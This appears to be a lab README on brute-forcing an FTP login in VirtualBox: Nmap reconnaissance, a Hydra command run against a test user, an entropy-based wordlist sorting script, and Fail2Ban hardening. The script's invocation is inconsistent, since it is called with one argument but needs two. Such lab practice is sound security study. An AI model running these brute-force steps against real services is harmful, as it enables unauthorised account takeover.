# Dictionaries, Scanning, and Hydra over FTP in VirtualBox

## 📋 Project Description

This repository documents the setup and execution of a controlled brute-force attack against an **FTP service** using clear-text authentication. The practice aims to provide a didactic environment to experiment with the risks of non-encrypted protocols and the techniques of reconnaissance (**Nmap**) and brute force (**Hydra**).

The environment was deployed using **VirtualBox**, consisting of a victim machine running the `vsftpd` service and an attacker machine (Kali Linux) for the security assessment.

### Key Objectives:
* Design and deploy the victim and attacker machines.
* Use **Nmap** for reconnaissance of the target service (FTP, port 21).
* Optimize password dictionaries using an **entropy** calculation script to prioritize complex passwords.
* Execute a brute-force attack with **Hydra**.
* Document final **cleaning and hardening** actions (closing ports, disabling services, installing Fail2Ban).

---

## 🛠️ Environment and Tools Used

* **Deployment Platform:** VirtualBox
* **Services/Tools:**
    * `vsftpd`: FTP server on the victim machine.
    * `Hydra`: Brute-force attack tool.
    * `Nmap`: Port scanner.
    * `Python3`: For the dictionary optimization script.
    * `Fail2Ban`: Hardening tool for automated defense.
    * `Git`: To clone large password dictionaries (SecLists, Probable-Wordlists).

---

## 💻 Step-by-Step Command Guide

### A. Victim Machine Configuration (FTP Service)

| Command | Description |
| :--- | :--- |
| `sudo apt install vsftpd -y` | Installs the clear-text FTP server. |
| `sudo systemctl restart vsftpd` | Restarts the `vsftpd` service. |
| `sudo systemctl enable vsftpd` | Ensures the FTP service is always running. |
| `sudo adduser ftpuser` | Creates the target user for the attack (Password: `ftp12345`). |
| `sudo ufw allow 21/tcp` | Activates port 21 on the victim machine's firewall. |

### B. Attacker Machine Configuration (Tools and Dictionaries)

| Command | Description |
| :--- | :--- |
| `sudo apt update` | Updates the package list. |
| `sudo apt install hydra nmap git python3 python3-pip -y` | Installs the key tools (Hydra, Nmap, Git, Python3). |
| `mkdir ~/diccionarios` | Creates a directory to collect dictionaries. |
| `cd ~/diccionarios` | Navigates to the new directory. |
| `git clone https://github.com/danielmiessler/SecLists.git` | Downloads the SecLists dictionary repository. |
| `git clone https://github.com/berzerk0/Probable-Wordlists.git` | Downloads the Probable-Wordlists repository. |

### C. Reconnaissance and Brute-Force Attack Phase

| Command | Description |
| :--- | :--- |
| `nmap -p 21 10.0.2.5` | Scans the victim machine to confirm that port 21 (ftp) is open. |
| `python3 ordenar_entropia.py diccionario_top.txt` | Executes the entropy script to optimize the dictionary. |
| `hydra -l ftpuser -P diccionario_top.txt ftp://10.0.2.5 -o hydra_found.txt -t 4 -V` | Initiates the brute-force attack with Hydra against the FTP server. |

### D. Hardening and Cleanup (Post-Attack)

| Command | Description |
| :--- | :--- |
| `sudo apt install fail2ban -y` | Installs Fail2Ban on the victim machine. |
| `sudo systemctl enable fail2ban` | Enables the service to start automatically. |
| `sudo systemctl start fail2ban` | Starts the Fail2Ban service. |
| `sudo nano /etc/fail2ban/jail.local` | Edits the configuration to add the attacker's IP to the whitelist (`Ignoreip 10.0.2.15/24`). |
| `sudo ufw delete allow 21/tcp` | **Closes port 21**. |
| `sudo userdel -r ftpuser` | **Deletes the test user** (`ftpuser`). |
| `sudo systemctl disable vsftpd` | **Disables the vsftpd service**. |

---

## 🐍 Optimization Script (`ordenar_entropia.py`)

The script calculates the entropy (complexity) of each password and sorts the dictionary to prioritize more complex entries first, aiming for higher efficiency in the brute-force attack.

```python
import math, sys
import collections

# Function to calculate the entropy (complexity) of a string (password)
def entropy(s):
    if not s:
        return 0
    # Counts the frequency of each character in the string
    counter = collections.Counter(s)
    length = len(s)
    
    # Calculates Shannon entropy (in bits)
    return -sum((count/length) * math.log2(count/length) for count in counter.values())

# Main function to process files
def main(infile, outfile):
    # Reads the input file
    with open(infile, errors='ignore') as f:
        # Creates a list of unique, stripped passwords
        pw = [p.strip() for p in f if p.strip()]
    
    # Sorts the password list by entropy (highest to lowest)
    sorted_pw = sorted(set(pw), key=lambda x: entropy(x), reverse=True)
    
    # Writes the sorted passwords to the output file
    with open(outfile, 'w') as f:
        f.write('\n'.join(sorted_pw))

# Script execution entry point
if __name__ == "__main__":
    # Requires the input file name and output file name as arguments
    # Example: python3 ordenar_entropia.py dictionary_in.txt dictionary_out.txt
    main(sys.argv[1], sys.argv[2])
